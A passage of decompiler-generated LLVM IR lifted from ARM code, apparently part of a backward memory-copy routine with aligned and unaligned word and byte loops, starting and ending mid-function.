  br i1 %v6_13f2c, label %dec_label_pc_13f30.loopexit, label %dec_label_pc_13f18.dec_label_pc_13f18_crit_edge

dec_label_pc_13f18.dec_label_pc_13f18_crit_edge:  ; preds = %dec_label_pc_13f18
  %v0_13f18.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13f18

dec_label_pc_13f30.loopexit:                      ; preds = %dec_label_pc_13f18
  %v4_13f28 = sub i32 31, %v0_13f28
  %v5_13f28 = and i32 %v4_13f28, %v0_13f28
  %v6_13f28 = icmp slt i32 %v5_13f28, 0
  %v7_13f28 = icmp slt i32 %v2_13f28, 0
  store i1 %v6_13f28, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_13f28, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13f30

dec_label_pc_13f30:                               ; preds = %dec_label_pc_13f30.loopexit, %dec_label_pc_13f0c
  %v6_13f38 = phi i32 [ %v1_13f24, %dec_label_pc_13f30.loopexit ], [ %v0_13f1c36, %dec_label_pc_13f0c ]
  %v0_13f40.pr = phi i32 [ %v2_13f28, %dec_label_pc_13f30.loopexit ], [ %v2_13f10, %dec_label_pc_13f0c ]
  %v4_13f30 = add i32 %v0_13f40.pr, 16
  %v6_13f30 = sub i32 0, %v0_13f40.pr
  %v7_13f30 = and i32 %v4_13f30, %v6_13f30
  %v8_13f30 = icmp slt i32 %v7_13f30, 0
  store i1 %v8_13f30, i1* %cpsr_v.global-to-local, align 1
  %v9_13f30 = icmp slt i32 %v4_13f30, 0
  store i1 %v9_13f30, i1* %cpsr_n.global-to-local, align 1
  %v10_13f30 = icmp eq i32 %v4_13f30, 0
  store i1 %v10_13f30, i1* %cpsr_z.global-to-local, align 1
  %v5_13f34 = icmp slt i32 %v0_13f40.pr, -16
  br i1 %v5_13f34, label %.thread1, label %bb147

bb147:                                            ; preds = %dec_label_pc_13f30
  %v6_13f34 = load i32, i32* @r1, align 4
  %v7_13f34 = add i32 %v6_13f34, -4
  %v8_13f34 = inttoptr i32 %v7_13f34 to i32*
  %v9_13f34 = load i32, i32* %v8_13f34, align 4
  store i32 %v9_13f34, i32* @r3, align 4
  %v10_13f34 = add i32 %v6_13f34, -8
  %v11_13f34 = inttoptr i32 %v10_13f34 to i32*
  %v12_13f34 = load i32, i32* %v11_13f34, align 4
  store i32 %v12_13f34, i32* %r4.global-to-local, align 4
  %v13_13f34 = add i32 %v6_13f34, -12
  %v14_13f34 = inttoptr i32 %v13_13f34 to i32*
  %v15_13f34 = load i32, i32* %v14_13f34, align 4
  store i32 %v15_13f34, i32* @ip, align 4
  %v16_13f34 = add i32 %v6_13f34, -16
  %v17_13f34 = inttoptr i32 %v16_13f34 to i32*
  %v18_13f34 = load i32, i32* %v17_13f34, align 4
  store i32 %v18_13f34, i32* %lr.global-to-local, align 4
  store i32 %v16_13f34, i32* @r1, align 4
  %v7_13f38 = add i32 %v6_13f38, -16
  %v8_13f38 = inttoptr i32 %v7_13f38 to i32*
  store i32 %v9_13f34, i32* %v8_13f38, align 4
  %v10_13f38 = add i32 %v6_13f38, -12
  %v11_13f38 = inttoptr i32 %v10_13f38 to i32*
  %v12_13f38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_13f38, i32* %v11_13f38, align 4
  %v13_13f38 = add i32 %v6_13f38, -8
  %v14_13f38 = inttoptr i32 %v13_13f38 to i32*
  %v15_13f38 = load i32, i32* @ip, align 4
  store i32 %v15_13f38, i32* %v14_13f38, align 4
  %v16_13f38 = add i32 %v6_13f38, -4
  %v17_13f38 = inttoptr i32 %v16_13f38 to i32*
  %v18_13f38 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_13f38, i32* %v17_13f38, align 4
  store i32 %v7_13f38, i32* %r0.global-to-local, align 4
  %v6_13f3c = load i32, i32* %r2.global-to-local, align 4
  %v7_13f3c = add i32 %v6_13f3c, -16
  store i32 %v7_13f3c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13f30, %bb147
  %v6_13f48 = phi i32 [ %v7_13f38, %bb147 ], [ %v6_13f38, %dec_label_pc_13f30 ]
  %v0_13f40 = phi i32 [ %v7_13f3c, %bb147 ], [ %v0_13f40.pr, %dec_label_pc_13f30 ]
  %v4_13f40 = add i32 %v0_13f40, 20
  store i32 %v4_13f40, i32* %r2.global-to-local, align 4
  %v6_13f40 = sub i32 0, %v0_13f40
  %v7_13f40 = and i32 %v4_13f40, %v6_13f40
  %v8_13f40 = icmp slt i32 %v7_13f40, 0
  store i1 %v8_13f40, i1* %cpsr_v.global-to-local, align 1
  %v9_13f40 = icmp slt i32 %v4_13f40, 0
  store i1 %v9_13f40, i1* %cpsr_n.global-to-local, align 1
  %v10_13f40 = icmp eq i32 %v4_13f40, 0
  store i1 %v10_13f40, i1* %cpsr_z.global-to-local, align 1
  %v5_13f44 = icmp slt i32 %v0_13f40, -20
  br i1 %v5_13f44, label %.thread3, label %bb148

bb148:                                            ; preds = %.thread1
  %v6_13f44 = load i32, i32* @r1, align 4
  %v7_13f44 = add i32 %v6_13f44, -4
  %v8_13f44 = inttoptr i32 %v7_13f44 to i32*
  %v9_13f44 = load i32, i32* %v8_13f44, align 4
  store i32 %v9_13f44, i32* @r3, align 4
  %v10_13f44 = add i32 %v6_13f44, -8
  %v11_13f44 = inttoptr i32 %v10_13f44 to i32*
  %v12_13f44 = load i32, i32* %v11_13f44, align 4
  store i32 %v12_13f44, i32* @ip, align 4
  %v13_13f44 = add i32 %v6_13f44, -12
  %v14_13f44 = inttoptr i32 %v13_13f44 to i32*
  %v15_13f44 = load i32, i32* %v14_13f44, align 4
  store i32 %v15_13f44, i32* %lr.global-to-local, align 4
  store i32 %v13_13f44, i32* @r1, align 4
  %v7_13f48 = add i32 %v6_13f48, -12
  %v8_13f48 = inttoptr i32 %v7_13f48 to i32*
  store i32 %v9_13f44, i32* %v8_13f48, align 4
  %v10_13f48 = add i32 %v6_13f48, -8
  %v11_13f48 = inttoptr i32 %v10_13f48 to i32*
  %v12_13f48 = load i32, i32* @ip, align 4
  store i32 %v12_13f48, i32* %v11_13f48, align 4
  %v13_13f48 = add i32 %v6_13f48, -4
  %v14_13f48 = inttoptr i32 %v13_13f48 to i32*
  %v15_13f48 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_13f48, i32* %v14_13f48, align 4
  store i32 %v7_13f48, i32* %r0.global-to-local, align 4
  %v6_13f4c = load i32, i32* %r2.global-to-local, align 4
  %v7_13f4c = add i32 %v6_13f4c, -12
  store i32 %v7_13f4c, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb148
  %v6_13f6c44 = phi i32 [ %v6_13f48, %.thread1 ], [ %v7_13f48, %bb148 ]
  %v0_13f5442 = phi i32 [ %v4_13f40, %.thread1 ], [ %v7_13f4c, %bb148 ]
  %v2_13f50 = load i8*, i8** %stack_var_-8, align 4
  %v3_13f50 = ptrtoint i8* %v2_13f50 to i32
  store i32 %v3_13f50, i32* @r4, align 4
  store i32 %v8_13f0c, i32* @lr, align 4
  br label %dec_label_pc_13f54

dec_label_pc_13f54:                               ; preds = %dec_label_pc_13f04, %.thread3
  %v7_13f64 = phi i32 [ %v0_13f1c36, %dec_label_pc_13f04 ], [ %v6_13f6c44, %.thread3 ]
  %v0_13f54 = phi i32 [ %v2_13f04, %dec_label_pc_13f04 ], [ %v0_13f5442, %.thread3 ]
  %v2_13f54 = add i32 %v0_13f54, 8
  store i32 %v2_13f54, i32* %r2.global-to-local, align 4
  %v4_13f54 = sub i32 0, %v0_13f54
  %v5_13f54 = and i32 %v2_13f54, %v4_13f54
  %v6_13f54 = icmp slt i32 %v5_13f54, 0
  store i1 %v6_13f54, i1* %cpsr_v.global-to-local, align 1
  %v7_13f54 = icmp slt i32 %v2_13f54, 0
  store i1 %v7_13f54, i1* %cpsr_n.global-to-local, align 1
  %v8_13f54 = icmp eq i32 %v2_13f54, 0
  store i1 %v8_13f54, i1* %cpsr_z.global-to-local, align 1
  %v5_13f58 = icmp slt i32 %v0_13f54, -8
  br i1 %v5_13f58, label %bb150, label %dec_label_pc_13f5c

dec_label_pc_13f5c:                               ; preds = %dec_label_pc_13f54
  %v6_13f5c = add i32 %v0_13f54, 4
  store i32 %v6_13f5c, i32* %r2.global-to-local, align 4
  %v8_13f5c = sub i32 -5, %v0_13f54
  %v9_13f5c = and i32 %v8_13f5c, %v2_13f54
  %v10_13f5c = icmp slt i32 %v9_13f5c, 0
  store i1 %v10_13f5c, i1* %cpsr_v.global-to-local, align 1
  %v11_13f5c = icmp slt i32 %v6_13f5c, 0
  store i1 %v11_13f5c, i1* %cpsr_n.global-to-local, align 1
  %v12_13f5c = icmp eq i32 %v2_13f54, 4
  store i1 %v12_13f5c, i1* %cpsr_z.global-to-local, align 1
  %v5_13f60 = icmp slt i32 %v2_13f54, 4
  %v6_13f60 = load i32, i32* @r1, align 4
  %v7_13f60 = add i32 %v6_13f60, -4
  %v8_13f60 = inttoptr i32 %v7_13f60 to i32*
  %v9_13f60 = load i32, i32* %v8_13f60, align 4
  store i32 %v9_13f60, i32* @r3, align 4
  br i1 %v5_13f60, label %.thread7, label %bb149

.thread7:                                         ; preds = %dec_label_pc_13f5c
  store i32 %v7_13f60, i32* @r1, align 4
  %v8_13f64 = add i32 %v7_13f64, -4
  %v9_13f64 = inttoptr i32 %v8_13f64 to i32*
  store i32 %v9_13f60, i32* %v9_13f64, align 4
  %v10_13f64 = load i32, i32* %r0.global-to-local, align 4
  %v11_13f64 = add i32 %v10_13f64, -4
  store i32 %v11_13f64, i32* %r0.global-to-local, align 4
  %v0_13f74.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_13f5c
  %v10_13f68 = add i32 %v6_13f60, -8
  %v11_13f68 = inttoptr i32 %v10_13f68 to i32*
  %v12_13f68 = load i32, i32* %v11_13f68, align 4
  store i32 %v12_13f68, i32* @ip, align 4
  store i32 %v10_13f68, i32* @r1, align 4
  %v7_13f6c = add i32 %v7_13f64, -8
  %v8_13f6c = inttoptr i32 %v7_13f6c to i32*
  store i32 %v9_13f60, i32* %v8_13f6c, align 4
  %v10_13f6c = add i32 %v7_13f64, -4
  %v11_13f6c = inttoptr i32 %v10_13f6c to i32*
  %v12_13f6c = load i32, i32* @ip, align 4
  store i32 %v12_13f6c, i32* %v11_13f6c, align 4
  store i32 %v7_13f6c, i32* %r0.global-to-local, align 4
  %v6_13f70 = load i32, i32* %r2.global-to-local, align 4
  %v7_13f70 = add i32 %v6_13f70, -4
  store i32 %v7_13f70, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread7, %.thread13, %dec_label_pc_13f54, %dec_label_pc_13ee4, %dec_label_pc_14118, %dec_label_pc_140ac, %dec_label_pc_14040, %bb149
  %v2_13f78 = phi i32 [ %v11_13f64, %.thread7 ], [ %v0_1401019, %.thread13 ], [ %v7_13f64, %dec_label_pc_13f54 ], [ %v2_13ee8, %dec_label_pc_13ee4 ], [ %v2_13f8452, %dec_label_pc_14118 ], [ %v2_13f8451, %dec_label_pc_140ac ], [ %v2_13f8450, %dec_label_pc_14040 ], [ %v7_13f6c, %bb149 ]
  %v0_13f74 = phi i32 [ %v0_13f74.pre, %.thread7 ], [ %v2_13fb8, %.thread13 ], [ %v2_13f54, %dec_label_pc_13f54 ], [ %v2_13eec, %dec_label_pc_13ee4 ], [ %v0_13f7448, %dec_label_pc_14118 ], [ %v0_13f7447, %dec_label_pc_140ac ], [ %v0_13f7446, %dec_label_pc_14040 ], [ %v7_13f70, %bb149 ]
  %v1_13f74 = add i32 %v0_13f74, 4
  store i32 %v1_13f74, i32* @r2, align 4
  %v3_13f74 = sub i32 0, %v0_13f74
  %v4_13f74 = and i32 %v1_13f74, %v3_13f74
  %v5_13f74 = icmp slt i32 %v4_13f74, 0
  store i1 %v5_13f74, i1* %cpsr_v.global-to-local, align 1
  %v6_13f74 = icmp slt i32 %v1_13f74, 0
  store i1 %v6_13f74, i1* %cpsr_n.global-to-local, align 1
  %v7_13f74 = icmp eq i32 %v1_13f74, 0
  store i1 %v7_13f74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13f74, label %.thread129, label %bb151

bb151:                                            ; preds = %bb150
  %v1_13f7c = add i32 %v0_13f74, 2
  %v3_13f7c = sub i32 -3, %v0_13f74
  %v4_13f7c = and i32 %v3_13f7c, %v1_13f74
  %v5_13f7c = icmp slt i32 %v4_13f7c, 0
  store i1 %v5_13f7c, i1* %cpsr_v.global-to-local, align 1
  %v6_13f7c = icmp slt i32 %v1_13f7c, 0
  store i1 %v6_13f7c, i1* %cpsr_n.global-to-local, align 1
  %v7_13f7c = icmp eq i32 %v1_13f74, 2
  store i1 %v7_13f7c, i1* %cpsr_z.global-to-local, align 1
  %v0_13f80 = load i32, i32* @r1, align 4
  %v1_13f80 = add i32 %v0_13f80, -1
  %v2_13f80 = inttoptr i32 %v1_13f80 to i8*
  %v3_13f80 = load i8, i8* %v2_13f80, align 1
  %v4_13f80 = zext i8 %v3_13f80 to i32
  store i32 %v4_13f80, i32* @r3, align 4
  store i32 %v1_13f80, i32* @r1, align 4
  %v3_13f84 = add i32 %v2_13f78, -1
  %v4_13f84 = inttoptr i32 %v3_13f84 to i8*
  store i8 %v3_13f80, i8* %v4_13f84, align 1
  %v5_13f84 = load i32, i32* %r0.global-to-local, align 4
  %v6_13f84 = add i32 %v5_13f84, -1
  store i32 %v6_13f84, i32* %r0.global-to-local, align 4
  %v0_13f88 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_13f88 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_13f88 = xor i1 %v0_13f88, %v1_13f88
  br i1 %v2_13f88, label %.thread128, label %bb152

bb152:                                            ; preds = %bb151
  %v3_13f88 = load i32, i32* @r1, align 4
  %v4_13f88 = add i32 %v3_13f88, -1
  %v5_13f88 = inttoptr i32 %v4_13f88 to i8*
  %v6_13f88 = load i8, i8* %v5_13f88, align 1
  %v7_13f88 = zext i8 %v6_13f88 to i32
  store i32 %v7_13f88, i32* @r3, align 4
  store i32 %v4_13f88, i32* @r1, align 4
  %v6_13f8c = add i32 %v5_13f84, -2
  %v7_13f8c = inttoptr i32 %v6_13f8c to i8*
  store i8 %v6_13f88, i8* %v7_13f8c, align 1
  %v8_13f8c = load i32, i32* %r0.global-to-local, align 4
  %v9_13f8c = add i32 %v8_13f8c, -1
  store i32 %v9_13f8c, i32* %r0.global-to-local, align 4
  %v1_13f90.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_13f90.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread128

.thread128:                                       ; preds = %bb151, %bb152
  %v7_13f94 = phi i32 [ %v9_13f8c, %bb152 ], [ %v6_13f84, %bb151 ]
  %v2_13f94 = phi i1 [ %v2_13f90.pre, %bb152 ], [ %v1_13f88, %bb151 ]
  %v1_13f94 = phi i1 [ %v1_13f90.pre, %bb152 ], [ %v0_13f88, %bb151 ]
  %v0_13f90 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_13f90 = xor i1 %v2_13f94, %v1_13f94
  %v4_13f90 = or i1 %v0_13f90, %v3_13f90
  br i1 %v4_13f90, label %.thread129, label %bb153

bb153:                                            ; preds = %.thread128
  %v5_13f90 = load i32, i32* @r1, align 4
  %v6_13f90 = add i32 %v5_13f90, -1
  %v7_13f90 = inttoptr i32 %v6_13f90 to i8*
  %v8_13f90 = load i8, i8* %v7_13f90, align 1
  %v9_13f90 = zext i8 %v8_13f90 to i32
  store i32 %v9_13f90, i32* @r3, align 4
  store i32 %v6_13f90, i32* @r1, align 4
  %v8_13f94 = add i32 %v7_13f94, -1
  %v9_13f94 = inttoptr i32 %v8_13f94 to i8*
  store i8 %v8_13f90, i8* %v9_13f94, align 1
  %v10_13f94 = load i32, i32* %r0.global-to-local, align 4
  %v11_13f94 = add i32 %v10_13f94, -1
  store i32 %v11_13f94, i32* %r0.global-to-local, align 4
  br label %.thread129

dec_label_pc_13f9c:                               ; preds = %dec_label_pc_13ef4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_13f9c = icmp eq i32 %v1_13ef4, 1
  store i1 %v8_13f9c, i1* %cpsr_n.global-to-local, align 1
  %v9_13f9c = icmp eq i32 %v1_13ef4, 2
  store i1 %v9_13f9c, i1* %cpsr_z.global-to-local, align 1
  %v1_13fa0 = add i32 %v2_13ee4, -1
  %v2_13fa0 = inttoptr i32 %v1_13fa0 to i8*
  %v3_13fa0 = load i8, i8* %v2_13fa0, align 1
  %v4_13fa0 = zext i8 %v3_13fa0 to i32
  store i32 %v4_13fa0, i32* @r3, align 4
  store i32 %v1_13fa0, i32* @r1, align 4
  %v3_13fa4 = add i32 %v2_13ee8, -1
  %v4_13fa4 = inttoptr i32 %v3_13fa4 to i8*
  store i8 %v3_13fa0, i8* %v4_13fa4, align 1
  %v5_13fa4 = load i32, i32* %r0.global-to-local, align 4
  %v6_13fa4 = add i32 %v5_13fa4, -1
  store i32 %v6_13fa4, i32* %r0.global-to-local, align 4
  br i1 %v8_13f9c, label %.thread13, label %bb154

bb154:                                            ; preds = %dec_label_pc_13f9c
  %v6_13fa8 = load i32, i32* @r1, align 4
  %v7_13fa8 = add i32 %v6_13fa8, -1
  %v8_13fa8 = inttoptr i32 %v7_13fa8 to i8*
  %v9_13fa8 = load i8, i8* %v8_13fa8, align 1
  %v10_13fa8 = zext i8 %v9_13fa8 to i32
  store i32 %v10_13fa8, i32* @r3, align 4
  store i32 %v7_13fa8, i32* @r1, align 4
  %v9_13fac = add i32 %v5_13fa4, -2
  %v10_13fac = inttoptr i32 %v9_13fac to i8*
  store i8 %v9_13fa8, i8* %v10_13fac, align 1
  %v11_13fac = load i32, i32* %r0.global-to-local, align 4
  %v12_13fac = add i32 %v11_13fac, -1
  store i32 %v12_13fac, i32* %r0.global-to-local, align 4
  br i1 %v9_13f9c, label %.thread13, label %bb155

bb155:                                            ; preds = %bb154
  %v8_13fb0 = load i32, i32* @r1, align 4
  %v9_13fb0 = add i32 %v8_13fb0, -1
  %v10_13fb0 = inttoptr i32 %v9_13fb0 to i8*
  %v11_13fb0 = load i8, i8* %v10_13fb0, align 1
  %v12_13fb0 = zext i8 %v11_13fb0 to i32
  store i32 %v12_13fb0, i32* @r3, align 4
  store i32 %v9_13fb0, i32* @r1, align 4
  %v11_13fb4 = add i32 %v11_13fac, -2
  %v12_13fb4 = inttoptr i32 %v11_13fb4 to i8*
  store i8 %v11_13fb0, i8* %v12_13fb4, align 1
  %v13_13fb4 = load i32, i32* %r0.global-to-local, align 4
  %v14_13fb4 = add i32 %v13_13fb4, -1
  store i32 %v14_13fb4, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb154, %dec_label_pc_13f9c, %bb155
  %v0_1401019 = phi i32 [ %v12_13fac, %bb154 ], [ %v6_13fa4, %dec_label_pc_13f9c ], [ %v14_13fb4, %bb155 ]
  %v0_13fb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13fb8 = load i32, i32* @ip, align 4
  %v2_13fb8 = sub i32 %v0_13fb8, %v1_13fb8
  store i32 %v2_13fb8, i32* %r2.global-to-local, align 4
  %v4_13fb8 = xor i32 %v1_13fb8, %v0_13fb8
  %v5_13fb8 = xor i32 %v2_13fb8, %v0_13fb8
  %v6_13fb8 = and i32 %v5_13fb8, %v4_13fb8
  %v7_13fb8 = icmp slt i32 %v6_13fb8, 0
  store i1 %v7_13fb8, i1* %cpsr_v.global-to-local, align 1
  %v8_13fb8 = icmp slt i32 %v2_13fb8, 0
  store i1 %v8_13fb8, i1* %cpsr_n.global-to-local, align 1
  %v9_13fb8 = icmp eq i32 %v0_13fb8, %v1_13fb8
  store i1 %v9_13fb8, i1* %cpsr_z.global-to-local, align 1
  %v5_13fbc = icmp slt i32 %v0_13fb8, %v1_13fb8
  br i1 %v5_13fbc, label %bb150, label %dec_label_pc_13fc0

dec_label_pc_13fc0:                               ; preds = %.thread13
  %v0_13fc0 = load i32, i32* @r1, align 4
  %v1_13fc0 = urem i32 %v0_13fc0, 4
  store i32 %v1_13fc0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13fc0 = icmp eq i32 %v1_13fc0, 0
  store i1 %v2_13fc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fc0, label %dec_label_pc_13f04, label %dec_label_pc_13fc8

dec_label_pc_13fc8:                               ; preds = %dec_label_pc_13efc, %dec_label_pc_13fc0
  %v0_1401018 = phi i32 [ %v2_13ee8, %dec_label_pc_13efc ], [ %v0_1401019, %dec_label_pc_13fc0 ]
  %v0_140bc = phi i32 [ %v2_13eec, %dec_label_pc_13efc ], [ %v2_13fb8, %dec_label_pc_13fc0 ]
  %v0_13fc8 = phi i32 [ %v2_13ee4, %dec_label_pc_13efc ], [ %v0_13fc0, %dec_label_pc_13fc0 ]
  %v0_13fd0 = phi i32 [ %v1_13efc, %dec_label_pc_13efc ], [ %v1_13fc0, %dec_label_pc_13fc0 ]
  %v1_13fc8 = and i32 %v0_13fc8, -4
  store i32 %v1_13fc8, i32* %r1.global-to-local, align 4
  %v1_13fcc = inttoptr i32 %v1_13fc8 to i32*
  %v2_13fcc = load i32, i32* %v1_13fcc, align 4
  store i32 %v2_13fcc, i32* @r3, align 4
  %v7_13fd0 = icmp ult i32 %v0_13fd0, 2
  %v2_140b4 = add i32 %v0_140bc, -12
  %v4_140b4 = sub i32 11, %v0_140bc
  %v5_140b4 = and i32 %v4_140b4, %v0_140bc
  %v6_140b4 = icmp slt i32 %v5_140b4, 0
  store i1 %v6_140b4, i1* %cpsr_v.global-to-local, align 1
  %v7_140b4 = icmp slt i32 %v2_140b4, 0
  store i1 %v7_140b4, i1* %cpsr_n.global-to-local, align 1
  %v8_140b4 = icmp eq i32 %v0_140bc, 12
  store i1 %v8_140b4, i1* %cpsr_z.global-to-local, align 1
  %v5_140b8 = icmp slt i32 %v0_140bc, 12
  br i1 %v7_13fd0, label %dec_label_pc_140b4, label %dec_label_pc_13fd8

dec_label_pc_13fd8:                               ; preds = %dec_label_pc_13fc8
  %v8_13fd0 = icmp eq i32 %v0_13fd0, 2
  br i1 %v8_13fd0, label %dec_label_pc_14048, label %dec_label_pc_13fdc

dec_label_pc_13fdc:                               ; preds = %dec_label_pc_13fd8
  br i1 %v5_140b8, label %dec_label_pc_14028, label %dec_label_pc_13fe4

dec_label_pc_13fe4:                               ; preds = %dec_label_pc_13fdc
  store i32 %v2_140b4, i32* %r2.global-to-local, align 4
  %v3_13fe8 = load i32, i32* @r4, align 4
  store i32 %v3_13fe8, i32* %stack_var_-12, align 4
  %v6_13fe8 = load i32, i32* @r5, align 4
  %v8_13fe8 = inttoptr i32 %v6_13fe8 to i8*
  store i8* %v8_13fe8, i8** %stack_var_-8, align 4
  %v11_13fe8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_13fec

dec_label_pc_13fec:                               ; preds = %dec_label_pc_13fec.dec_label_pc_13fec_crit_edge, %dec_label_pc_13fe4
  %v0_14010 = phi i32 [ %v1_14010, %dec_label_pc_13fec.dec_label_pc_13fec_crit_edge ], [ %v0_1401018, %dec_label_pc_13fe4 ]
  %v0_13ff0 = phi i32 [ %v0_13ff0.pre, %dec_label_pc_13fec.dec_label_pc_13fec_crit_edge ], [ %v1_13fc8, %dec_label_pc_13fe4 ]
  %v0_13fec = phi i32 [ %v0_13fec.pre, %dec_label_pc_13fec.dec_label_pc_13fec_crit_edge ], [ %v2_13fcc, %dec_label_pc_13fe4 ]
  %v3_13fec = mul i32 %v0_13fec, 256
  store i32 %v3_13fec, i32* %lr.global-to-local, align 4
  %v1_13ff0 = add i32 %v0_13ff0, -4
  %v2_13ff0 = inttoptr i32 %v1_13ff0 to i32*
  %v3_13ff0 = load i32, i32* %v2_13ff0, align 4
  store i32 %v3_13ff0, i32* @r3, align 4
  %v4_13ff0 = add i32 %v0_13ff0, -8
  %v5_13ff0 = inttoptr i32 %v4_13ff0 to i32*
  %v6_13ff0 = load i32, i32* %v5_13ff0, align 4
  store i32 %v6_13ff0, i32* %r4.global-to-local, align 4
  %v7_13ff0 = add i32 %v0_13ff0, -12
  %v8_13ff0 = inttoptr i32 %v7_13ff0 to i32*
  %v9_13ff0 = load i32, i32* %v8_13ff0, align 4
  store i32 %v9_13ff0, i32* %r5.global-to-local, align 4
  %v10_13ff0 = add i32 %v0_13ff0, -16
  %v11_13ff0 = inttoptr i32 %v10_13ff0 to i32*
  %v12_13ff0 = load i32, i32* %v11_13ff0, align 4
  store i32 %v10_13ff0, i32* %r1.global-to-local, align 4
  %v4_13ff4 = udiv i32 %v12_13ff0, 16777216
  %v5_13ff4 = or i32 %v4_13ff4, %v3_13fec
  store i32 %v5_13ff4, i32* %lr.global-to-local, align 4
  %v3_13ff8 = mul i32 %v12_13ff0, 256
  %v4_13ffc = udiv i32 %v9_13ff0, 16777216
  %v5_13ffc = or i32 %v3_13ff8, %v4_13ffc
  store i32 %v5_13ffc, i32* @ip, align 4
  %v3_14000 = mul i32 %v9_13ff0, 256
  %v4_14004 = udiv i32 %v6_13ff0, 16777216
  %v5_14004 = or i32 %v3_14000, %v4_14004
  store i32 %v5_14004, i32* %r5.global-to-local, align 4
  %v3_14008 = mul i32 %v6_13ff0, 256
  %v4_1400c = udiv i32 %v3_13ff0, 16777216
  %v5_1400c = or i32 %v3_14008, %v4_1400c
  store i32 %v5_1400c, i32* %r4.global-to-local, align 4
  %v1_14010 = add i32 %v0_14010, -16
  %v2_14010 = inttoptr i32 %v1_14010 to i32*
  store i32 %v5_1400c, i32* %v2_14010, align 4
  %v4_14010 = add i32 %v0_14010, -12
  %v5_14010 = inttoptr i32 %v4_14010 to i32*
  %v6_14010 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14010, i32* %v5_14010, align 4
  %v7_14010 = add i32 %v0_14010, -8
  %v8_14010 = inttoptr i32 %v7_14010 to i32*
  %v9_14010 = load i32, i32* @ip, align 4
  store i32 %v9_14010, i32* %v8_14010, align 4
  %v10_14010 = add i32 %v0_14010, -4
  %v11_14010 = inttoptr i32 %v10_14010 to i32*
  %v12_14010 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14010, i32* %v11_14010, align 4
  store i32 %v1_14010, i32* %r0.global-to-local, align 4
  %v0_14014 = load i32, i32* %r2.global-to-local, align 4
  %v2_14014 = add i32 %v0_14014, -16
  store i32 %v2_14014, i32* %r2.global-to-local, align 4
  %v6_14018 = icmp slt i32 %v0_14014, 16
  br i1 %v6_14018, label %dec_label_pc_1401c, label %dec_label_pc_13fec.dec_label_pc_13fec_crit_edge

dec_label_pc_13fec.dec_label_pc_13fec_crit_edge:  ; preds = %dec_label_pc_13fec
  %v0_13fec.pre = load i32, i32* @r3, align 4
  %v0_13ff0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13fec

dec_label_pc_1401c:                               ; preds = %dec_label_pc_13fec
  %v2_1401c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1401c, i32* @r4, align 4
  %v5_1401c = load i8*, i8** %stack_var_-8, align 4
  %v6_1401c = ptrtoint i8* %v5_1401c to i32
  store i32 %v6_1401c, i32* @r5, align 4
  store i32 %v11_13fe8, i32* @lr, align 4
  %v2_14020 = add i32 %v0_14014, -4
  store i32 %v2_14020, i32* %r2.global-to-local, align 4
  %v4_14020 = add i32 %v0_14014, 2147483632
  %v5_14020 = and i32 %v2_14020, %v4_14020
  %v6_14020 = icmp slt i32 %v5_14020, 0
  store i1 %v6_14020, i1* %cpsr_v.global-to-local, align 1
  %v7_14020 = icmp slt i32 %v2_14020, 0
  store i1 %v7_14020, i1* %cpsr_n.global-to-local, align 1
  %v8_14020 = icmp eq i32 %v2_14020, 0
  store i1 %v8_14020, i1* %cpsr_z.global-to-local, align 1
  %v5_14024 = icmp slt i32 %v2_14014, -12
  br i1 %v5_14024, label %dec_label_pc_14040, label %dec_label_pc_14028

dec_label_pc_14028:                               ; preds = %dec_label_pc_1401c, %dec_label_pc_13fdc, %dec_label_pc_14028
  %v1_14034 = phi i32 [ %v5_14034, %dec_label_pc_14028 ], [ %v1_14010, %dec_label_pc_1401c ], [ %v0_1401018, %dec_label_pc_13fdc ]
  %v0_14028 = load i32, i32* @r3, align 4
  %v3_14028 = mul i32 %v0_14028, 256
  store i32 %v3_14028, i32* %ip.global-to-local, align 4
  %v0_1402c = load i32, i32* %r1.global-to-local, align 4
  %v1_1402c = add i32 %v0_1402c, -4
  %v2_1402c = inttoptr i32 %v1_1402c to i32*
  %v3_1402c = load i32, i32* %v2_1402c, align 4
  store i32 %v3_1402c, i32* @r3, align 4
  store i32 %v1_1402c, i32* %r1.global-to-local, align 4
  %v4_14030 = udiv i32 %v3_1402c, 16777216
  %v5_14030 = or i32 %v4_14030, %v3_14028
  store i32 %v5_14030, i32* @ip, align 4
  %v2_14034 = add i32 %v1_14034, -4
  %v3_14034 = inttoptr i32 %v2_14034 to i32*
  store i32 %v5_14030, i32* %v3_14034, align 4
  %v4_14034 = load i32, i32* %r0.global-to-local, align 4
  %v5_14034 = add i32 %v4_14034, -4
  store i32 %v5_14034, i32* %r0.global-to-local, align 4
  %v0_14038 = load i32, i32* %r2.global-to-local, align 4
  %v2_14038 = add i32 %v0_14038, -4
  store i32 %v2_14038, i32* %r2.global-to-local, align 4
  %v6_1403c = icmp slt i32 %v0_14038, 4
  br i1 %v6_1403c, label %dec_label_pc_14040.loopexit, label %dec_label_pc_14028

